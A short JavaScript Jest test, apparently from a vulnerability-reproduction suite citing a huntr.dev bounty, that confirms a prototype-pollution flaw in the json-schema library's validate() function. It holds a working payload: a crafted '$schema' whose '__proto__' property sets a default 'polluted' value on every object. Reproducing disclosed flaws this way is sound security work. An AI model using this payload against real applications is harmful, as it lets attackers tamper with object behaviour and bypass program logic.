//https://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9/
test("prototype pollution in json-schema", () => {
  const { validate } = require("json-schema");
  const instance = JSON.parse(`
    {
      "$schema":{
        "type": "object",
        "properties":{
          "__proto__": {
            "type": "object",
            
            "properties":{
              "polluted": {
                  "type": "string",
                  "default": "yes"
              }
            }
          }
        },
        "__proto__": {}
      }
    }`);

  expect({}.polluted).toBe(undefined);

  validate(instance);

  expect({}.polluted).toBe("yes");
});
